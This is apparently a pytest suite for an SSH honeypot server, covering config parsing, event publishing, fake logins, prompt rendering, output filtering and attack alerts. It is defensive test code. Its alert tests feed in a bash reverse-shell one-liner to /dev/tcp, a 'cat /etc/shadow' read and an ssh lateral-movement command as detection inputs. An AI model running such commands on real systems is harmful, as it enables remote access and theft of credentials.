"""
Unit tests for the SSH decoy server module.

Tests DecoyConfig, EventEmitter, DecoySSHServer, DecoySSHSession,
and helper functions. All external dependencies (asyncssh, NATS,
filesystem, command router) are mocked.
"""

import asyncio
import importlib
import importlib.util
import json
import sys
import types
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# Mock heavy external deps that are not installed in the test environment
# ---------------------------------------------------------------------------
_SSH_DECOY_DIR = str(Path(__file__).resolve().parent.parent.parent / "ssh-decoy")
if _SSH_DECOY_DIR not in sys.path:
    sys.path.insert(0, _SSH_DECOY_DIR)

# asyncssh stubs
if "asyncssh" not in sys.modules:
    _asyncssh = types.ModuleType("asyncssh")
    _asyncssh.SSHServer = type("SSHServer", (), {})
    _asyncssh.SSHServerConnection = MagicMock
    _asyncssh.SSHServerProcess = MagicMock
    _asyncssh.SSHKey = MagicMock
    _asyncssh.ConnectionLost = type("ConnectionLost", (Exception,), {})
    _asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
    _asyncssh.TerminalSizeChanged = type("TerminalSizeChanged", (Exception,), {})
    _asyncssh.BreakReceived = type("BreakReceived", (Exception,), {})
    _asyncssh.read_private_key = MagicMock()
    _asyncssh.create_server = AsyncMock()
    sys.modules["asyncssh"] = _asyncssh

# nats stubs (may already exist if nats-py is installed)
if "nats" not in sys.modules:
    _nats = types.ModuleType("nats")
    _nats.connect = AsyncMock()
    _nats.NATS = MagicMock
    sys.modules["nats"] = _nats

# ssh-decoy/server.py collides with inference/server.py on sys.path,
# so import via importlib.util to load from an explicit file path.
_SSH_DECOY_SERVER = str(Path(__file__).resolve().parent.parent.parent / "ssh-decoy" / "server.py")
_spec = importlib.util.spec_from_file_location("ssh_decoy_server", _SSH_DECOY_SERVER)
_server_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_server_mod)

DecoyConfig = _server_mod.DecoyConfig
DecoySSHServer = _server_mod.DecoySSHServer
DecoySSHSession = _server_mod.DecoySSHSession
EventEmitter = _server_mod.EventEmitter
_strip_ssh2_prefix = _server_mod._strip_ssh2_prefix
create_server_factory = _server_mod.create_server_factory
create_process_factory = _server_mod.create_process_factory


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

MINIMAL_YAML = {
    "metadata": {"name": "test-decoy"},
    "spec": {
        "identity": {
            "hostname": "web-prod-01",
            "domain": "corp.local",
            "fingerprint": {"sshBanner": "OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"},
        },
        "service": {"port": 2222},
        "fidelity": {
            "tier": 2,
            "adaptive": {
                "inferenceConfig": {
                    "endpoint": "http://inference:8000",
                    "maxSessionTokens": 4096,
                    "temperature": 0.5,
                },
                "profileRef": "web-server",
                "fastPath": {"enabled": False},
                "guardrails": {
                    "filterPatterns": ["cicdecoy"],
                    "disallowedPaths": ["/proc/self"],
                    "maxResponseLines": 200,
                },
            },
            "scripted": {
                "customResponses": [
                    {"match": "uptime", "response": " 10:00:00 up 42 days"}
                ],
            },
        },
        "authentication": {
            "mode": "selective",
            "credentials": [
                {"username": "admin", "password": "admin123"},
            ],
            "realisticAuth": {
                "failBeforeSuccess": 2,
                "lockoutAfter": 5,
                "lockoutDuration": 120,
            },
        },
        "telemetry": {
            "sessionCapture": {"keystrokeTimings": True},
            "exporters": [
                {"type": "nats", "endpoint": "nats://nats:4222",
                 "subject": "test.events"},
            ],
        },
    },
}


def _make_config(**overrides) -> DecoyConfig:
    """Build a DecoyConfig with sensible test defaults."""
    defaults = dict(
        name="test-decoy",
        hostname="web-prod-01",
        domain="corp.local",
        tier=2,
        port=2222,
        ssh_banner="OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
        auth_mode="selective",
        credentials=[
            {"username": "admin", "password": "admin123",
             "shell": "/bin/bash", "uid": 1000, "home": "/home/admin"},
            {"username": "root", "password": "toor",
             "shell": "/bin/bash", "uid": 0, "home": "/root"},
        ],
        fail_before_success=1,
        lockout_after=10,
        lockout_duration=300,
        nats_endpoint="nats://localhost:4222",
        nats_subject="cicdecoy.decoy.events",
        fast_path_commands=[],
        filter_patterns=[],
        disallowed_paths=[],
        max_response_lines=500,
        custom_responses=[],
    )
    defaults.update(overrides)
    # Pre-compile filter_patterns if passed as raw strings (matches
    # production behaviour where from_file() compiles them).
    fp = defaults.get("filter_patterns", [])
    if fp and isinstance(fp[0], str):
        import re
        compiled = []
        for pat in fp:
            try:
                compiled.append(re.compile(pat))
            except re.error:
                pass  # Skip invalid patterns, same as production
        defaults["filter_patterns"] = compiled
    return DecoyConfig(**defaults)


def _mock_emitter(config=None) -> EventEmitter:
    """Return an EventEmitter with a mocked NATS connection."""
    config = config or _make_config()
    emitter = EventEmitter(config)
    emitter.nc = AsyncMock()
    emitter._connected = True
    return emitter


def _mock_router() -> MagicMock:
    router = AsyncMock()
    router.route = AsyncMock(return_value="mock output")
    router.last_source = "scripted"
    return router


def _mock_filesystem() -> MagicMock:
    fs = MagicMock()
    fs.read_file = MagicMock(return_value="")
    return fs


# ===================================================================
#  _strip_ssh2_prefix
# ===================================================================

class TestStripSSH2Prefix:

    def test_strips_single_prefix(self):
        assert _strip_ssh2_prefix("SSH-2.0-OpenSSH_8.9p1") == "OpenSSH_8.9p1"

    def test_strips_double_prefix(self):
        assert _strip_ssh2_prefix("SSH-2.0-SSH-2.0-OpenSSH_8.9p1") == "OpenSSH_8.9p1"

    def test_no_prefix_unchanged(self):
        assert _strip_ssh2_prefix("OpenSSH_8.9p1") == "OpenSSH_8.9p1"

    def test_case_insensitive(self):
        assert _strip_ssh2_prefix("ssh-2.0-OpenSSH_8.9p1") == "OpenSSH_8.9p1"

    def test_empty_string(self):
        assert _strip_ssh2_prefix("") == ""


# ===================================================================
#  DecoyConfig
# ===================================================================

class TestDecoyConfig:

    def test_defaults_returns_working_config(self):
        config = DecoyConfig.defaults()
        assert config.port == 2222
        assert config.tier == 2
        assert config.auth_mode == "selective"
        assert len(config.credentials) == 2
        assert config.credentials[0]["username"] == "admin"

    def test_defaults_has_root_credential(self):
        config = DecoyConfig.defaults()
        usernames = [c["username"] for c in config.credentials]
        assert "root" in usernames

    def test_from_file_parses_spec(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        assert config.name == "test-decoy"
        assert config.hostname == "web-prod-01"
        assert config.domain == "corp.local"
        assert config.tier == 2
        assert config.port == 2222
        assert config.auth_mode == "selective"

    def test_from_file_parses_authentication(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        assert config.fail_before_success == 2
        assert config.lockout_after == 5
        assert config.lockout_duration == 120
        assert len(config.credentials) == 1

    def test_from_file_parses_nats_config(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        assert config.nats_endpoint == "nats://nats:4222"
        assert config.nats_subject == "test.events"

    def test_from_file_parses_inference_config(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        assert config.inference_endpoint == "http://inference:8000"
        assert config.max_session_tokens == 4096
        assert config.temperature == 0.5
        assert config.profile_name == "web-server"

    def test_from_file_parses_guardrails(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        # filter_patterns are now pre-compiled re.Pattern objects
        assert any(p.pattern == "cicdecoy" for p in config.filter_patterns)
        assert "/proc/self" in config.disallowed_paths
        assert config.max_response_lines == 200

    def test_from_file_parses_custom_responses(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        assert len(config.custom_responses) == 1
        assert config.custom_responses[0]["match"] == "uptime"

    def test_from_file_strips_ssh_banner_prefix(self, tmp_path):
        import yaml
        data = {
            "metadata": {"name": "banner-test"},
            "spec": {
                "identity": {
                    "fingerprint": {"sshBanner": "SSH-2.0-OpenSSH_8.9p1"},
                },
                "fidelity": {"tier": 1},
            },
        }
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(data))
        config = DecoyConfig.from_file(str(config_file))
        assert config.ssh_banner == "OpenSSH_8.9p1"

    def test_from_file_fast_path_disabled(self, tmp_path):
        import yaml
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(MINIMAL_YAML))

        config = DecoyConfig.from_file(str(config_file))
        assert config.fast_path_commands == []

    def test_from_file_fast_path_enabled(self, tmp_path):
        import yaml
        data = {
            "spec": {
                "fidelity": {
                    "tier": 3,
                    "adaptive": {
                        "fastPath": {
                            "enabled": True,
                            "commands": [
                                {"match": "whoami", "source": "static"},
                            ],
                        },
                    },
                },
            },
        }
        config_file = tmp_path / "decoy.yaml"
        config_file.write_text(yaml.dump(data))
        config = DecoyConfig.from_file(str(config_file))
        assert len(config.fast_path_commands) == 1
        assert config.fast_path_commands[0]["match"] == "whoami"

    def test_default_field_values(self):
        config = DecoyConfig()
        assert config.name == "ssh-decoy"
        assert config.hostname == "localhost"
        assert config.tier == 2
        assert config.port == 2222
        assert config.auth_mode == "selective"
        assert config.credentials == []
        assert config.fast_path_commands == []
        assert config.filter_patterns == []


# ===================================================================
#  EventEmitter
# ===================================================================

class TestEventEmitter:

    @pytest.mark.asyncio
    async def test_connect_success(self):
        config = _make_config()
        emitter = EventEmitter(config)
        mock_nc = AsyncMock()
        with patch.object(_server_mod.nats, "connect", return_value=mock_nc):
            await emitter.connect()
        assert emitter._connected is True
        assert emitter.nc is mock_nc

    @pytest.mark.asyncio
    async def test_connect_failure_sets_disconnected(self):
        config = _make_config()
        emitter = EventEmitter(config)
        with patch.object(_server_mod.nats, "connect", side_effect=ConnectionRefusedError("refused")):
            await emitter.connect()
        assert emitter._connected is False

    @pytest.mark.asyncio
    async def test_emit_publishes_to_nats(self):
        emitter = _mock_emitter()
        await emitter.emit("test.event", "session-123", {"key": "value"})

        emitter.nc.publish.assert_called_once()
        call_args = emitter.nc.publish.call_args
        subject = call_args[0][0]
        payload = json.loads(call_args[0][1].decode())

        assert "test-decoy" in subject
        assert "test.event" in subject
        assert payload["event_type"] == "test.event"
        assert payload["session_id"] == "session-123"
        assert payload["data"]["key"] == "value"
        assert "event_id" in payload
        assert "timestamp" in payload

    @pytest.mark.asyncio
    async def test_emit_includes_source_metadata(self):
        config = _make_config(name="my-decoy", tier=3)
        emitter = _mock_emitter(config)
        await emitter.emit("auth.success", "sess-1", {})

        payload = json.loads(emitter.nc.publish.call_args[0][1].decode())
        assert payload["source"]["decoy"] == "my-decoy"
        assert payload["source"]["tier"] == 3

    @pytest.mark.asyncio
    async def test_emit_when_disconnected_does_not_raise(self):
        config = _make_config()
        emitter = EventEmitter(config)
        emitter._connected = False
        # Should not raise
        await emitter.emit("test", "sess", {"data": True})

    @pytest.mark.asyncio
    async def test_emit_publish_failure_does_not_raise(self):
        emitter = _mock_emitter()
        emitter.nc.publish.side_effect = Exception("NATS error")
        # Should not raise
        await emitter.emit("test", "sess", {})

    @pytest.mark.asyncio
    async def test_close_drains_connection(self):
        emitter = _mock_emitter()
        await emitter.close()
        emitter.nc.drain.assert_called_once()

    @pytest.mark.asyncio
    async def test_close_when_not_connected(self):
        config = _make_config()
        emitter = EventEmitter(config)
        emitter._connected = False
        # Should not raise
        await emitter.close()


# ===================================================================
#  DecoySSHServer
# ===================================================================

class TestDecoySSHServer:

    def _make_server(self, **config_overrides):
        config = _make_config(**config_overrides)
        auth = MagicMock()
        emitter = _mock_emitter(config)
        router = _mock_router()
        fs = _mock_filesystem()
        server = DecoySSHServer(config, auth, emitter, router, fs)
        return server, auth, emitter

    def test_connection_made_extracts_peername(self):
        server, _, emitter = self._make_server()
        conn = MagicMock()
        conn.get_extra_info.return_value = ("10.0.0.5", 54321)
        server.connection_made(conn)
        assert server._client_ip == "10.0.0.5"
        assert server._client_port == 54321

    def test_connection_made_handles_no_peername(self):
        server, _, _ = self._make_server()
        conn = MagicMock()
        conn.get_extra_info.return_value = None
        server.connection_made(conn)
        assert server._client_ip == "unknown"

    def test_password_auth_supported(self):
        server, _, _ = self._make_server()
        assert server.password_auth_supported() is True

    def test_public_key_auth_supported(self):
        server, _, _ = self._make_server()
        assert server.public_key_auth_supported() is True

    def test_begin_auth_returns_true(self):
        server, _, _ = self._make_server()
        assert server.begin_auth("admin") is True

    def test_session_requested_returns_true(self):
        server, _, _ = self._make_server()
        assert server.session_requested() is True

    def test_server_requested_rejects_tunneling(self):
        server, _, _ = self._make_server()
        result = server.server_requested("10.0.0.1", 80, "127.0.0.1", 12345)
        assert result is False

    @pytest.mark.asyncio
    async def test_validate_password_success(self):
        server, auth, emitter = self._make_server()
        auth.check_password.return_value = MagicMock(accepted=True, reason="valid")

        with patch.object(_server_mod.asyncio, "sleep", new_callable=AsyncMock):
            result = await server.validate_password("admin", "admin123")

        assert result is True
        assert server._authenticated_user == "admin"

    @pytest.mark.asyncio
    async def test_validate_password_failure(self):
        server, auth, emitter = self._make_server()
        auth.check_password.return_value = MagicMock(accepted=False, reason="wrong")

        with patch.object(_server_mod.asyncio, "sleep", new_callable=AsyncMock):
            result = await server.validate_password("admin", "wrong")

        assert result is False
        assert server._authenticated_user is None

    @pytest.mark.asyncio
    async def test_validate_password_emits_event(self):
        server, auth, emitter = self._make_server()
        auth.check_password.return_value = MagicMock(accepted=True, reason="valid")

        with patch.object(_server_mod.asyncio, "sleep", new_callable=AsyncMock):
            await server.validate_password("admin", "admin123")

        emitter.nc.publish.assert_called()
        # Find the auth event
        for call in emitter.nc.publish.call_args_list:
            payload = json.loads(call[0][1].decode())
            if payload["event_type"] == "auth.success":
                assert payload["data"]["username"] == "admin"
                break

    @pytest.mark.asyncio
    async def test_validate_public_key_always_rejects(self):
        server, _, emitter = self._make_server()
        mock_key = MagicMock()
        mock_key.get_fingerprint.return_value = "SHA256:abc123"
        result = await server.validate_public_key("admin", mock_key)
        assert result is False

    def test_connection_lost_logs_reason(self):
        server, _, _ = self._make_server()
        # Should not raise
        server.connection_lost(Exception("reset"))
        server.connection_lost(None)


# ===================================================================
#  DecoySSHSession
# ===================================================================

class TestDecoySSHSession:

    def _make_session(self, username="admin", **config_overrides):
        config = _make_config(**config_overrides)
        emitter = _mock_emitter(config)
        router = _mock_router()
        fs = _mock_filesystem()
        session = DecoySSHSession(
            config, emitter, router, fs,
            username=username, client_ip="10.0.0.1",
        )
        return session, emitter, router, fs

    def test_session_id_generated(self):
        session, _, _, _ = self._make_session()
        assert session._session_id is not None
        assert len(session._session_id) == 36  # UUID format

    def test_session_resolves_uid_from_credentials(self):
        session, _, _, _ = self._make_session(username="admin")
        assert session._state.uid == 1000
        assert session._state.home == "/home/admin"

    def test_session_resolves_root_uid(self):
        session, _, _, _ = self._make_session(username="root")
        assert session._state.uid == 0
        assert session._state.home == "/root"

    def test_session_unknown_user_gets_defaults(self):
        session, _, _, _ = self._make_session(username="unknown")
        assert session._state.uid == 1000
        assert session._state.home == "/home/unknown"

    def test_command_count_starts_at_zero(self):
        session, _, _, _ = self._make_session()
        assert session._command_count == 0

    def test_render_prompt_regular_user(self):
        session, _, _, _ = self._make_session(username="admin")
        prompt = session._render_prompt()
        assert "admin" in prompt
        assert "web-prod-01" in prompt
        assert "$" in prompt

    def test_render_prompt_root_user(self):
        session, _, _, _ = self._make_session(username="root")
        prompt = session._render_prompt()
        assert "root" in prompt
        assert "#" in prompt

    def test_render_prompt_home_shown_as_tilde(self):
        session, _, _, _ = self._make_session(username="admin")
        # cwd starts as home
        prompt = session._render_prompt()
        assert "~" in prompt

    def test_apply_guardrails_filters_patterns(self):
        session, _, _, _ = self._make_session(
            filter_patterns=["honeypot", "cicdecoy"]
        )
        result = session._apply_guardrails("this is a honeypot system running cicdecoy")
        assert "honeypot" not in result
        assert "cicdecoy" not in result
        assert "[FILTERED]" in result

    def test_apply_guardrails_truncates_long_output(self):
        session, _, _, _ = self._make_session(max_response_lines=5)
        long_output = "\n".join([f"line {i}" for i in range(100)])
        result = session._apply_guardrails(long_output)
        assert len(result.split("\n")) == 5

    def test_apply_guardrails_empty_response(self):
        session, _, _, _ = self._make_session()
        assert session._apply_guardrails("") == ""
        assert session._apply_guardrails(None) is None

    def test_apply_guardrails_invalid_regex_skipped(self):
        session, _, _, _ = self._make_session(filter_patterns=["[invalid"])
        # Should not raise
        result = session._apply_guardrails("some text [invalid")
        assert "some text" in result

    @pytest.mark.asyncio
    async def test_check_alerts_detects_reverse_shell(self):
        session, emitter, _, _ = self._make_session()
        await session._check_alerts("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")

        # Should have emitted an alert
        found_alert = False
        for call in emitter.nc.publish.call_args_list:
            payload = json.loads(call[0][1].decode())
            if payload["event_type"] == "alert":
                assert payload["data"]["behavior"] == "reverse_shell"
                assert payload["data"]["severity"] == "critical"
                found_alert = True
                break
        assert found_alert

    @pytest.mark.asyncio
    async def test_check_alerts_detects_lateral_movement(self):
        session, emitter, _, _ = self._make_session()
        await session._check_alerts("ssh admin@192.168.1.100")

        found_alert = False
        for call in emitter.nc.publish.call_args_list:
            payload = json.loads(call[0][1].decode())
            if payload["event_type"] == "alert":
                assert payload["data"]["behavior"] == "lateral_movement"
                found_alert = True
                break
        assert found_alert

    @pytest.mark.asyncio
    async def test_check_alerts_detects_credential_access(self):
        session, emitter, _, _ = self._make_session()
        await session._check_alerts("cat /etc/shadow")

        found_alert = False
        for call in emitter.nc.publish.call_args_list:
            payload = json.loads(call[0][1].decode())
            if payload["event_type"] == "alert":
                assert payload["data"]["behavior"] == "credential_access"
                found_alert = True
                break
        assert found_alert

    @pytest.mark.asyncio
    async def test_check_alerts_no_alert_for_benign(self):
        session, emitter, _, _ = self._make_session()
        await session._check_alerts("ls -la")
        # No alert events should be emitted
        for call in emitter.nc.publish.call_args_list:
            payload = json.loads(call[0][1].decode())
            assert payload["event_type"] != "alert"

    @pytest.mark.asyncio
    async def test_inject_latency_instant_commands(self):
        session, _, _, _ = self._make_session()
        with patch.object(_server_mod.asyncio, "sleep", new_callable=AsyncMock) as mock_sleep:
            await session._inject_latency("pwd", 0.0)
            if mock_sleep.called:
                delay = mock_sleep.call_args[0][0]
                assert delay < 0.1  # instant commands should be fast

    @pytest.mark.asyncio
    async def test_inject_latency_network_commands(self):
        session, _, _, _ = self._make_session()
        with patch.object(_server_mod.asyncio, "sleep", new_callable=AsyncMock) as mock_sleep:
            with patch.object(_server_mod.random, "uniform", return_value=2.0):
                await session._inject_latency("curl", 0.0)
                if mock_sleep.called:
                    delay = mock_sleep.call_args[0][0]
                    assert delay > 0.3  # network commands should be slower

    @pytest.mark.asyncio
    async def test_inject_latency_no_sleep_if_already_slow(self):
        session, _, _, _ = self._make_session()
        with patch.object(_server_mod.asyncio, "sleep", new_callable=AsyncMock) as mock_sleep:
            # Already took 10 seconds -- no additional sleep needed
            await session._inject_latency("ls", 10.0)
            mock_sleep.assert_not_called()

    @pytest.mark.asyncio
    async def test_handle_command_routes_and_emits(self):
        session, emitter, router, _ = self._make_session()
        router.route.return_value = "uid=1000(admin)"
        response = await session._handle_command("id")

        router.route.assert_called_once()
        assert response == "uid=1000(admin)"
        assert session._state is not None


# ===================================================================
#  Server & Process Factories
# ===================================================================

class TestFactories:

    def test_create_server_factory_returns_callable(self):
        config = _make_config()
        auth = MagicMock()
        emitter = _mock_emitter(config)
        router = _mock_router()
        fs = _mock_filesystem()
        factory = create_server_factory(config, auth, emitter, router, fs)
        server = factory()
        assert isinstance(server, DecoySSHServer)

    def test_create_process_factory_returns_coroutine_function(self):
        config = _make_config()
        emitter = _mock_emitter(config)
        router = _mock_router()
        fs = _mock_filesystem()
        handler = create_process_factory(config, emitter, router, fs)
        assert asyncio.iscoroutinefunction(handler)
